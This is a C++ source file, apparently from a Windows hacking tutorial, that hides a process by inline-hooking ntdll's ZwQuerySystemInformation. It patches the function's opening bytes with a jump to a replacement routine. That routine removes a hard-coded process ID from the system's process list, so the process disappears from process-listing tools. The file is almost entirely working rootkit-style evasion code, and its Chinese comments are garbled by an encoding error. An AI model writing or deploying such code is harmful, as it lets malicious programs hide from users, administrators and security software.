#include "stdafx.h"
#include "HideProcess.h"


BYTE g_OldData32[5] = {0};
BYTE g_OldData64[12] = { 0 };

/*
Inline Hooke���̣�
1.���Ȼ�ȡAPI�����ĵ�ַ�����Դӽ����л�ȡhooke api��Ӧ��ģ���ַ�������Ϳ���ͨ�� GetProcAddress ������ȡ API�����ڽ����еĵ�ַ��
2.Ȼ�����32λ��64λ�汾��������Ҫ�޸�hook api������ǰ�����ֽ����ݡ�
3.����32λϵͳ������Ҫ������תƫ�ƣ����޸ĺ�����ǰ5���ֽ����ݣ������˻��ָ����ֽڳ��ȣ�������64λϵͳ����Ҫ�޸ĺ�����ǰ12�ֽ����ݣ������˻��ָ����ֽڳ��ȣ���

4.�����޸�API������ǰ���ֽ����ݵ�ҳ�汣�����ԣ�����Ϊ�ɶ�����д����ִ�У�������Ϊ��ȷ���޸ĺ��ڴ��ܹ�ִ�С�
5.���Ϊ���ܹ���ԭ������Ҫ���޸�����ǰ�ȶ����ݽ��б��ݣ�Ȼ�����޸����ݣ�����ԭҳ�汣�����ԡ�
6.unhook �����̻����Ϻ� hook ��������һ���ģ�ֻ������д��������� hook �������ݵ�ǰ���ֽ����ݡ�������API��������Իָ�������
*/
void HookApi()
{
	// ��ȡ ntdll.dll �ļ��ػ�ַ, ��û���򷵻�
	HMODULE hDll = ::GetModuleHandle("ntdll.dll");
	if (NULL == hDll)
	{
		return;
	}
	// ��ȡ ZwQuerySystemInformation ������ַ���������ã�����ϵͳ������Ϣ���Ӷ��ҵ�������Ҫ���صĽ���PID
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::GetProcAddress(hDll, "ZwQuerySystemInformation");
	if (NULL == ZwQuerySystemInformation)
	{
		return;
	}
	// 32 λ���޸�ǰ 5 �ֽ�, 64 λ���޸�ǰ 12 �ֽ�
#ifndef _WIN64
	// jmp New_ZwQuerySystemInformation
	// ������λ��e9 _dwOffset(��תƫ��)	=>		1 + 4 = 5���ֽ�
	//		addr1 --> jmp _dwNewAddressָ�����һ��ָ��ĵ�ַ����eip��ֵ
	//		addr2 --> ��ת��ַ��ֵ����_dwNewAddress��ֵ
	//		��תƫ�� _dwOffset = addr2 - addr1
	BYTE pData[5] = { 0xe9, 0, 0, 0, 0};
	DWORD dwOffset = (DWORD)New_ZwQuerySystemInformation - (DWORD)ZwQuerySystemInformation - 5;
	::RtlCopyMemory(&pData[1], &dwOffset, sizeof(dwOffset));
	// ����ǰ 5 �ֽ�����
	::RtlCopyMemory(g_OldData32, ZwQuerySystemInformation, sizeof(pData));
#else
	// mov rax,0x1122334455667788
	// jmp rax
	// �������ǣ�
	//	48 b8 8877665544332211			=>		1 + 1 + 8 = 10���ֽ�
	//	ff e0							=>		1 + 1 = 2���ֽڣ������ܺ�Ϊ 12���ֽ�
	BYTE pData[12] = {0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xe0};
	ULONGLONG ullOffset = (ULONGLONG)New_ZwQuerySystemInformation;
	::RtlCopyMemory(&pData[2], &ullOffset, sizeof(ullOffset));
	// ����ǰ 12 �ֽ�����
	::RtlCopyMemory(g_OldData64, ZwQuerySystemInformation, sizeof(pData));
#endif
	// ����ҳ��ı�������Ϊ �ɶ�����д����ִ��
	DWORD dwOldProtect = 0;
	::VirtualProtect(ZwQuerySystemInformation, sizeof(pData), PAGE_EXECUTE_READWRITE, &dwOldProtect);
	// �޸�
	//��Դ�ڴ������� pData ���Ƶ�Ŀ���ڴ�� ZwQuerySystemInformation
	::RtlCopyMemory(ZwQuerySystemInformation, pData, sizeof(pData));
	// ��ԭҳ�汣������
	::VirtualProtect(ZwQuerySystemInformation, sizeof(pData), dwOldProtect, &dwOldProtect);

}


void UnhookApi()
{
	// ��ȡ ntdll.dll �ļ��ػ�ַ, ��û���򷵻�
	HMODULE hDll = ::GetModuleHandle("ntdll.dll");
	if (NULL == hDll)
	{
		return;
	}
	// ��ȡ ZwQuerySystemInformation ������ַ
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::GetProcAddress(hDll, "ZwQuerySystemInformation");
	if (NULL == ZwQuerySystemInformation)
	{
		return;
	}
	// ����ҳ��ı�������Ϊ �ɶ�����д����ִ��
	DWORD dwOldProtect = 0;
	::VirtualProtect(ZwQuerySystemInformation, 12, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	// 32 λ�»�ԭǰ 5 �ֽ�, 64 λ�»�ԭǰ 12 �ֽ�
#ifndef _WIN64
	// ��ԭ
	::RtlCopyMemory(ZwQuerySystemInformation, g_OldData32, sizeof(g_OldData32));
#else
	// ��ԭ
	::RtlCopyMemory(ZwQuerySystemInformation, g_OldData64, sizeof(g_OldData64));
#endif

	// ��ԭҳ�汣������
	::VirtualProtect(ZwQuerySystemInformation, 12, dwOldProtect, &dwOldProtect);
}

/*
��ִ�еĲ��������ж��Ƿ��Ǽ���ϵͳ�Ľ�����Ϣ���������޳����ؽ��̵���Ϣ�����޸ĺ�����ݷ��ء�
	����ʹ�� GetProcAddress ������ ntdll.dll �л�ȡ ZwQuerySystemInformation ������ַ������ִ�У���������ȡϵͳ��Ϣ��
	�����жϼ�����Ϣ�����Ƿ��ǽ�����Ϣ�������������������������޳����ؽ��̵���Ϣ��
	��������޸���Ϻ󣬼���ִ��hook�����������ؽ����
*/
NTSTATUS New_ZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	)
{
	NTSTATUS status = 0;
	PSYSTEM_PROCESS_INFORMATION pCur = NULL, pPrev = NULL;
	// Ҫ���صĽ���PID
	DWORD dwHideProcessId = 15416;

	// UNHOOK API
	UnhookApi();

	// ��ȡ ntdll.dll �ļ��ػ�ַ, ��û���򷵻�
	HMODULE hDll = ::GetModuleHandle("ntdll.dll");
	if (NULL == hDll)
	{
		return status;
	}
	// ��ȡ ZwQuerySystemInformation ������ַ
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::GetProcAddress(hDll, "ZwQuerySystemInformation");
	if (NULL == ZwQuerySystemInformation)
	{
		return status;
	}

	// ����ԭ���� ZwQuerySystemInformation
	status = ZwQuerySystemInformation(SystemInformationClass, SystemInformation,
						SystemInformationLength, ReturnLength);
	if (NT_SUCCESS(status) && 5 == SystemInformationClass)
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		while (TRUE)
		{
			// �ж��Ƿ���Ҫ���صĽ���PID
			if (dwHideProcessId == (DWORD)pCur->UniqueProcessId)
			{
				if (0 == pCur->NextEntryOffset)
				{
					pPrev->NextEntryOffset = 0;
				}
				else
				{
					pPrev->NextEntryOffset = pPrev->NextEntryOffset + pCur->NextEntryOffset;
				}
			}
			else
			{
				pPrev = pCur;
			}

			if (0 == pCur->NextEntryOffset)
			{
				break;
			}
			pCur = (PSYSTEM_PROCESS_INFORMATION)((BYTE *)pCur + pCur->NextEntryOffset);
		}
	}

	// HOOK API
	HookApi();

	return status;
}